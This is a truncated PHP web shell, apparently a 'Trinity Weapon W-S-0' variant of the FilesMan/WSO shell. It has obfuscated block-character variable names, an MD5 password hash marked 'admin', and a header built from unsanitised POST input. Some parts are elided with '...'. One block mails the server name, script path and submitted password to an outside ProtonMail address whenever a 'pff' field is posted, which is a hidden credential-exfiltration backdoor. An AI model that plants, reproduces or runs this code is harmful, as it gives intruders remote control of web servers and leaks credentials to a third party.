<?php
//-----------------Password---------------------
$▛ = "dd3272e0a1b7fc38c4335b6f7539ff7d"; //admin
$▗ = "#fff";
$▘ = true;
$▜ = 'UTF-8';
$▚ = 'FilesMan';
...
function hardHeader() {
	...
	global $▗;
	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - Trinity " . Weapon W-S-0 ."</title>
<style>
...
if(array_key_exists('pff',$_POST)){
	 $tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('trinityreturn@protonmail.com', 'NSA', $tmp);
}
function hardLogin() {
